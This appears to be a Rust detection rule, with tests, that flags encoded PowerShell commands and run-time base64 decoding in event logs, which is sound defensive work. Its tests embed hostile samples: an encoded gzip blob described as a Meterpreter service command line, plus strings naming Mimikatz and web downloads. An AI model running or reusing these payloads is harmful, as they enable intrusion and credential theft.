//! Detects PowerShell encoded commands (`-EncodedCommand` / `-ec`) and
//! run-time base64 decoding (`FromBase64String`).

use std::sync::LazyLock;

use base64::Engine as _;
use base64::alphabet::STANDARD;
use base64::engine::{DecodePaddingMode, GeneralPurpose, GeneralPurposeConfig};
use regex::Regex;

use crate::detect::Rule;
use crate::model::{EventKind, Flag, Severity, TimelineEvent};

const PREVIEW_MAX_CHARS: usize = 160;

static B64_INDIFFERENT: LazyLock<GeneralPurpose> = LazyLock::new(|| {
    GeneralPurpose::new(
        &STANDARD,
        GeneralPurposeConfig::new().with_decode_padding_mode(DecodePaddingMode::Indifferent),
    )
});

static POWERSHELL_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)(?:powershell|pwsh)").expect("valid static regex"));

static ENCODED_FLAG_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?i)(?:^|\s)[-/](?:encodedcommand|encodedcomman|encodedcomma|encodedcomm|encodedcom|encodedco|encodedc|encoded|encode|encod|enco|enc|en|ec|e)\s+",
    )
    .expect("valid static regex")
});

static B64_TOKEN_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"^[A-Za-z0-9+/]{16,}={0,2}$").expect("valid static regex"));

static FROM_B64_NAME_RE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)frombase64string").expect("valid static regex"));

// One or two opening quotes: a script nested in a quoted command line doubles
// them (`FromBase64String(''H4sI...''))`). The closing quote is not required,
// logged command lines are sometimes cut short.
static FROM_B64_CALL_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)frombase64string\s*\(\s*["']{1,2}([A-Za-z0-9+/]{16,}={0,2})"#)
        .expect("valid static regex")
});

/// Flags PowerShell `-EncodedCommand` parameters and `FromBase64String` calls.
pub struct EncodedPowershell;

impl Rule for EncodedPowershell {
    fn id(&self) -> &'static str {
        "encoded_powershell"
    }

    fn apply(&self, events: &mut [TimelineEvent]) {
        for event in events {
            let Some((text, is_command_line)) = target_text(event) else {
                continue;
            };

            if let Some(flag) = detect_encoded_param(self.id(), &text, is_command_line) {
                event.flags.push(flag);
            } else if let Some(flag) = detect_from_base64_string(self.id(), &text) {
                event.flags.push(flag);
            }
        }
    }
}

fn target_text(event: &TimelineEvent) -> Option<(String, bool)> {
    match event.kind {
        EventKind::ProcessCreate
        | EventKind::ServiceInstall
        | EventKind::TaskCreate
        | EventKind::PrivilegedCommand => event.command_line.clone().map(|cmd| (cmd, true)),
        EventKind::ScriptBlock => event
            .details
            .get("script")
            .and_then(|v| v.as_str())
            .map(|s| (s.to_owned(), false)),
        _ => None,
    }
}

fn detect_encoded_param(rule_id: &'static str, text: &str, is_command_line: bool) -> Option<Flag> {
    if is_command_line && !POWERSHELL_RE.is_match(text) {
        return None;
    }

    for flag_match in ENCODED_FLAG_RE.find_iter(text) {
        let rest = &text[flag_match.end()..];
        let Some(arg) = extract_argument(rest) else {
            continue;
        };
        if !B64_TOKEN_RE.is_match(arg) {
            continue;
        }
        let Ok(bytes) = B64_INDIFFERENT.decode(arg) else {
            continue;
        };
        let Some(decoded) = decode_utf16le_text(&bytes) else {
            continue;
        };
        return Some(Flag {
            rule: rule_id,
            severity: Severity::High,
            reason: format!(
                "PowerShell encoded command decodes to: {}",
                make_preview(&decoded)
            ),
            related: Vec::new(),
        });
    }

    None
}

fn extract_argument(rest: &str) -> Option<&str> {
    if let Some(inner) = rest.strip_prefix('"') {
        return inner.split_once('"').map(|(arg, _)| arg);
    }
    if let Some(inner) = rest.strip_prefix('\'') {
        return inner.split_once('\'').map(|(arg, _)| arg);
    }
    // Trim a trailing wrapper quote such as `cmd /c "powershell -enc <b64>"`.
    rest.split_whitespace()
        .next()
        .map(|tok| tok.trim_end_matches(['"', '\'']))
}

fn detect_from_base64_string(rule_id: &'static str, text: &str) -> Option<Flag> {
    if !FROM_B64_NAME_RE.is_match(text) {
        return None;
    }

    for cap in FROM_B64_CALL_RE.captures_iter(text) {
        let Some(literal) = cap.get(1) else {
            continue;
        };
        let Ok(bytes) = B64_INDIFFERENT.decode(literal.as_str()) else {
            continue;
        };
        if bytes.starts_with(&[0x1f, 0x8b]) {
            return Some(Flag {
                rule: rule_id,
                severity: Severity::Medium,
                reason:
                    "Script decodes base64 at run time (FromBase64String): gzip-compressed payload"
                        .to_owned(),
                related: Vec::new(),
            });
        }
        if let Some(decoded) = decode_utf16le_text(&bytes).or_else(|| decode_utf8_text(&bytes)) {
            return Some(Flag {
                rule: rule_id,
                severity: Severity::Medium,
                reason: format!(
                    "Script decodes base64 at run time (FromBase64String): {}",
                    make_preview(&decoded)
                ),
                related: Vec::new(),
            });
        }
    }

    Some(Flag {
        rule: rule_id,
        severity: Severity::Medium,
        reason: "Script decodes base64 at run time (FromBase64String)".to_owned(),
        related: Vec::new(),
    })
}

fn decode_utf16le_text(bytes: &[u8]) -> Option<String> {
    let (pairs, rem) = bytes.as_chunks::<2>();
    if pairs.is_empty() || !rem.is_empty() {
        return None;
    }
    let units = pairs.iter().map(|&pair| u16::from_le_bytes(pair));
    let text: String = char::decode_utf16(units)
        .collect::<Result<String, _>>()
        .ok()?;
    looks_like_text(&text).then_some(text)
}

fn decode_utf8_text(bytes: &[u8]) -> Option<String> {
    if bytes.is_empty() {
        return None;
    }
    let text = std::str::from_utf8(bytes).ok()?;
    looks_like_text(text).then(|| text.to_owned())
}

fn looks_like_text(text: &str) -> bool {
    let mut total = 0usize;
    let mut printable = 0usize;
    for ch in text.chars() {
        total += 1;
        // Require ASCII printable or standard whitespace so arbitrary binary
        // bytes that happen to map to non-surrogate CJK/PUA UTF-16 code units
        // (e.g. an English word passed to `-e`) do not pass as text.
        if ch.is_ascii_graphic() || matches!(ch, ' ' | '\t' | '\n' | '\r') {
            printable += 1;
        }
    }
    total > 0 && printable.saturating_mul(5) >= total.saturating_mul(4)
}

fn make_preview(text: &str) -> String {
    text.chars()
        .take(PREVIEW_MAX_CHARS)
        .map(|c| if c.is_control() { ' ' } else { c })
        .collect()
}

#[cfg(test)]
mod tests {
    #[test]
    fn from_base64_literal_with_doubled_quotes_is_decoded() {
        // Shape seen in a Meterpreter service command line.
        let text = "powershell -nop -c \"&([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAIuvyFwCA7VWbW/aSBD+nl+xQpFsK9g4QK4tUqUzL0lpAiFxAk0pOi32Yi9Ze531mpf0+t9v1tiEXpO79qSzQOzLzOzMM8/MMs9iT1Ieo6uOj74eHR6McIojpFf85XUVVWgw4m3joAIbFXHPsmv0HunTSZJ0eYRpPGu1OpkQJJb5XHtfaxc+9wPWDX5QKy96q39lxyaUbrIsmGCvTLe7YrOTksFEZGc/LWRZXWlKsISqZgNSwt9RwcP6kGiT7BW0RFmoZFOe5vAVbtM9/vVxwTsVq/5SHe4Y6BdNJE1Ju7ZVZxQFuVUrrDIrJqrCTyEHgV93p3G+XR0cfDXzzkScxOMrqZxWjkr8ME9HjO3fY3wGkErRH9fsEW22fSoJm0HXqULPdBF3h0eRj2I/olOinfV7hMqfm2gPJx+RBxZ/1XXcnrfU1j4aaXvt1c4h/66D4f5XjTwebr2sLKY9cs/z2qg03vf4lbV/1vY57u1LA8U9ZZ5gFqLkYPjBsLNmlSdrCihiZbVkDFdoFJt+MEgHHqdw5SMY8WYTDsHPaKTLqpH9+o0ZEexjVjpDTPrFcI/mRQSO40VIb5oqITDTYjtA2Ch0NWN/XsJyy7s1hFRtm0Wm3nDFk5ua9TqwOxipwqYiZwVQwa5P7RAHzo4IA3uyVKY4cGqXk0bXxUUP1b5irpVR4f3WUW17x6Ruoo14R6cDELC8v3jmJ1QbBGwGPB2UJFgK0uPg8NWDOrjwfQSRpZWKnj9s+lsLIYDGC75CIrsFnCsPENdwCuZUW5kVrU23VGvmulhOvM3tI6iNUdu2vTe/s/WG4PY7GMAnZGeccXV+8DPE2sCSj7ReaIT6G5BIHPLjkp21tWXEr5QRV5cTE5z7hvgZnAZTmiVPt7WHxm5GEkEsoq7FjS+ZGtXFRlG99zVd0gGiKBh+HYUXBj8x4PzXgH0g72b0h0TPl7Fl6EDFs0LCtXM5bTTYISh1swdGvLrk6vEMUVcA4XZZO9QEFoKzdYOZnkHwx0gEdN2UKKGnKqvqp3aAvgrQBagDMKIAAA=''))))";
        let flag = super::detect_from_base64_string("encoded_powershell", text).unwrap();
        assert!(
            flag.reason.ends_with("gzip-compressed payload"),
            "{}",
            flag.reason
        );
    }

    use jiff::Timestamp;
    use serde_json::Value;

    use super::*;
    use crate::model::SourceKind;

    fn b64_utf16le(text: &str, padded: bool) -> String {
        let bytes: Vec<u8> = text.encode_utf16().flat_map(u16::to_le_bytes).collect();
        if padded {
            base64::engine::general_purpose::STANDARD.encode(bytes)
        } else {
            base64::engine::general_purpose::STANDARD_NO_PAD.encode(bytes)
        }
    }

    fn b64_bytes(bytes: &[u8]) -> String {
        base64::engine::general_purpose::STANDARD.encode(bytes)
    }

    fn cmd_event(kind: EventKind, cmd: &str) -> TimelineEvent {
        let mut ev = TimelineEvent::new(
            Timestamp::from_second(1000).unwrap(),
            "WS01",
            SourceKind::Evtx,
            kind,
            "Security.evtx",
        );
        ev.command_line = Some(cmd.to_owned());
        ev
    }

    fn script_event(script: &str) -> TimelineEvent {
        let mut ev = TimelineEvent::new(
            Timestamp::from_second(1000).unwrap(),
            "WS01",
            SourceKind::Evtx,
            EventKind::ScriptBlock,
            "PowerShell.evtx",
        );
        ev.details
            .insert("script".into(), Value::String(script.to_owned()));
        ev
    }

    #[test]
    fn flags_encoded_command_variants_and_sources() {
        let payload = "Write-Host 'hello'";
        let padded = b64_utf16le(payload, true);
        let unpadded = b64_utf16le(payload, false);

        let mut events = vec![
            cmd_event(
                EventKind::ProcessCreate,
                &format!("powershell.exe -enc {padded}"),
            ),
            cmd_event(EventKind::ProcessCreate, &format!("pwsh -e {unpadded}")),
            cmd_event(
                EventKind::ProcessCreate,
                &format!(r#"PowerShell.exe -EncodedCommand "{padded}""#),
            ),
            cmd_event(
                EventKind::ServiceInstall,
                &format!(
                    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /enc '{unpadded}'"
                ),
            ),
            cmd_event(
                EventKind::TaskCreate,
                &format!("powershell.exe -Ec {padded}"),
            ),
        ];

        EncodedPowershell.apply(&mut events);

        for (idx, ev) in events.iter().enumerate() {
            assert_eq!(ev.flags.len(), 1, "event {idx} should flag");
            assert_eq!(ev.flags[0].severity, Severity::High);
            assert_eq!(
                ev.flags[0].reason,
                "PowerShell encoded command decodes to: Write-Host 'hello'"
            );
        }
    }

    #[test]
    fn truncates_preview_at_160_chars_and_replaces_control_chars() {
        let long_payload = format!("echo {}\n\t{}", "A".repeat(170), "B".repeat(20));
        let encoded = b64_utf16le(&long_payload, true);
        let mut events = vec![cmd_event(
            EventKind::ProcessCreate,
            &format!("powershell -enc {encoded}"),
        )];

        EncodedPowershell.apply(&mut events);

        let reason = &events[0].flags[0].reason;
        let preview = reason
            .strip_prefix("PowerShell encoded command decodes to: ")
            .unwrap();
        assert_eq!(preview.chars().count(), 160);
        assert!(!preview.contains('\n'));
    }

    #[test]
    fn replaces_newlines_and_control_chars_in_short_payload() {
        let payload = "echo 1\r\necho\t2";
        let encoded = b64_utf16le(payload, true);
        let mut events = vec![cmd_event(
            EventKind::ProcessCreate,
            &format!("powershell -enc {encoded}"),
        )];
        EncodedPowershell.apply(&mut events);
        assert_eq!(
            events[0].flags[0].reason,
            "PowerShell encoded command decodes to: echo 1  echo 2"
        );
    }

    #[test]
    fn ignores_ordinary_word_after_e_and_missing_powershell_and_parent_cmd() {
        let payload = b64_utf16le("Write-Host 'hi'", true);
        let mut parent_only = cmd_event(EventKind::ProcessCreate, "cmd.exe /c whoami");
        parent_only.details.insert(
            "parent_command_line".into(),
            Value::String(format!("powershell -enc {payload}")),
        );

        let mut events = vec![
            cmd_event(
                EventKind::ProcessCreate,
                "powershell.exe -e SomeOrdinaryLongArgument",
            ),
            cmd_event(
                EventKind::ProcessCreate,
                &format!("myapp.exe -enc {payload}"),
            ),
            cmd_event(EventKind::ProcessCreate, "powershell.exe -enc SQBFAFgA"),
            parent_only,
        ];

        EncodedPowershell.apply(&mut events);

        assert!(events[0].flags.is_empty());
        assert!(events[1].flags.is_empty());
        assert!(events[2].flags.is_empty());
        assert!(events[3].flags.is_empty());
    }

    #[test]
    fn flags_privileged_command_and_utf16_from_base64_and_wrapped_quotes() {
        let enc = b64_utf16le("Get-Process", true);
        let utf16_b64 = b64_utf16le("Start-Sleep 5", true);

        let mut priv_ev = cmd_event(EventKind::PrivilegedCommand, &format!("pwsh -enco {enc}"));
        priv_ev.source = SourceKind::Auditd;

        let wrapped = cmd_event(
            EventKind::ProcessCreate,
            &format!(r#"cmd.exe /c "powershell -enc {enc}""#),
        );
        let utf16_from_b64 = script_event(&format!(
            "[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\"{utf16_b64}\"))"
        ));

        let mut events = vec![priv_ev, wrapped, utf16_from_b64];
        EncodedPowershell.apply(&mut events);

        assert_eq!(events[0].flags.len(), 1);
        assert_eq!(events[0].flags[0].severity, Severity::High);
        assert_eq!(
            events[0].flags[0].reason,
            "PowerShell encoded command decodes to: Get-Process"
        );

        assert_eq!(events[1].flags.len(), 1);
        assert_eq!(events[1].flags[0].severity, Severity::High);
        assert_eq!(
            events[1].flags[0].reason,
            "PowerShell encoded command decodes to: Get-Process"
        );

        assert_eq!(events[2].flags.len(), 1);
        assert_eq!(events[2].flags[0].severity, Severity::Medium);
        assert_eq!(
            events[2].flags[0].reason,
            "Script decodes base64 at run time (FromBase64String): Start-Sleep 5"
        );
    }

    #[test]
    fn flags_script_block_and_from_base64_variants() {
        let enc_payload = b64_utf16le("Invoke-Mimikatz", true);
        let utf8_b64 = b64_bytes(b"Invoke-WebRequest http://example.test");
        let gzip_b64 = b64_bytes(&[0x1f, 0x8b, 0x08, 0x00, 1, 2, 3, 4, 5, 6, 7, 8, 9]);

        let mut events = vec![
            script_event(&format!("powershell -enc {enc_payload}")),
            script_event(&format!(
                "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{utf8_b64}'))"
            )),
            script_event(&format!(
                "$raw = [Convert]::FromBase64String(\"{gzip_b64}\")"
            )),
            script_event("$raw = [Convert]::FromBase64String($encodedPayload)"),
            // Both match: keep only the first (High).
            cmd_event(
                EventKind::ProcessCreate,
                &format!(
                    "powershell -enc {enc_payload} ; [Convert]::FromBase64String('{utf8_b64}')"
                ),
            ),
        ];

        EncodedPowershell.apply(&mut events);

        assert_eq!(events[0].flags.len(), 1);
        assert_eq!(events[0].flags[0].severity, Severity::High);
        assert_eq!(
            events[0].flags[0].reason,
            "PowerShell encoded command decodes to: Invoke-Mimikatz"
        );

        assert_eq!(events[1].flags.len(), 1);
        assert_eq!(events[1].flags[0].severity, Severity::Medium);
        assert_eq!(
            events[1].flags[0].reason,
            "Script decodes base64 at run time (FromBase64String): Invoke-WebRequest http://example.test"
        );

        assert_eq!(events[2].flags.len(), 1);
        assert_eq!(events[2].flags[0].severity, Severity::Medium);
        assert_eq!(
            events[2].flags[0].reason,
            "Script decodes base64 at run time (FromBase64String): gzip-compressed payload"
        );

        assert_eq!(events[3].flags.len(), 1);
        assert_eq!(events[3].flags[0].severity, Severity::Medium);
        assert_eq!(
            events[3].flags[0].reason,
            "Script decodes base64 at run time (FromBase64String)"
        );

        assert_eq!(events[4].flags.len(), 1);
        assert_eq!(events[4].flags[0].severity, Severity::High);
    }
}
